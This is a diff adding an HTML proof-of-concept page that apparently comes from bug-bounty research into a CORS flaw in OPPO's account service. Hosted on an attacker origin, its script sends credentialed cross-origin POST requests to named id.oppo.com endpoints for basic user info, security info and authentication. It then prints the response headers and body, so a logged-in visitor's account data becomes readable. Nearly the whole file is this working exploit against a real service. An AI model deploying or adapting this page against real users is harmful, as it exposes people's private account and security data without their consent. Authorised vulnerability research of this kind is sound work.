@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>OPPO CORS PoC - 0xobsyn</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #1e1e1e;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: #2d2d2d;
+            padding: 25px;
+            border-radius: 10px;
+        }
+
+        button {
+            padding: 12px 24px;
+            background: #c00;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        pre {
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+
+        .success {
+            color: #0f0;
+        }
+
+        .error {
+            color: #f66;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>OPPO Account CORS Exploitation PoC</h1>
+        <p><strong>Attacker Domain:</strong> https://Prasanth-0605.github.io/testcors/cors_poc.html</p>
+
+        <label>Target Domain:</label><br>
+        <input type="text" id="domain" value="https://id.oppo.com" style="width: 350px;"><br><br>
+
+        <select id="endpoint" style="width: 520px; padding: 8px;">
+            <option value="/uc/web/v1/user-info/query-basic">Basic User Info</option>
+            <option value="/uc/web/v1/user-info/security-info">Security Info</option>
+            <option value="/identity/web/v1/authn/auth">Auth Endpoint</option>
+            <option value="/v3/check">/v3/check</option>
+            <option value="/profile">/profile</option>
+        </select><br><br>
+
+        <button onclick="testCORS()">Test Credentialed CORS Request</button>
+
+        <h3>Request</h3>
+        <pre id="requestInfo"></pre>
+
+        <h3>Response Headers</h3>
+        <pre id="responseHeaders"></pre>
+
+        <h3>Response Body</h3>
+        <pre id="responseBody"></pre>
+
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const ATTACKER_ORIGIN = "https://Prasanth-0605.github.io/testcors/cors_poc.html";
+
+        async function testCORS() {
+            const target = document.getElementById('domain').value.trim();
+            const ep = document.getElementById('endpoint').value;
+            const url = target + ep;
+
+            document.getElementById('requestInfo').textContent = `POST ${url}\nOrigin: ${ATTACKER_ORIGIN}`;
+
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = "Sending request...";
+
+            try {
+                const res = await fetch(url, {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Origin": ATTACKER_ORIGIN,
+                        "X-HackerOne-Research": "0xobsyn"
+                    },
+                    body: JSON.stringify({})
+                });
+
+                let headers = `Status: ${res.status}\n`;
+                res.headers.forEach((v, k) => headers += `${k}: ${v}\n`);
+                document.getElementById('responseHeaders').textContent = headers;
+
+                const bodyText = await res.text();
+                document.getElementById('responseBody').textContent = bodyText.substring(0, 6000) + (bodyText.length > 6000 ? "\n... [truncated]" : "");
+
+                if (res.ok || res.status === 200 || res.status === 222) {
+                    statusEl.innerHTML = `<span class="success">✅ SUCCESS! Response readable via CORS.</span>`;
+                } else {
+                    statusEl.innerHTML = `<span class="error">Request completed with status ${res.status}</span>`;
+                }
+            } catch (err) {
+                console.error(err);
+                statusEl.innerHTML = `<span class="error">❌ Failed to fetch: ${err.message}<br>Try accepting the HTTPS warning or use a real hosted domain.</span>`;
+            }
+        }
+    </script>
+</body>
+
+</html>
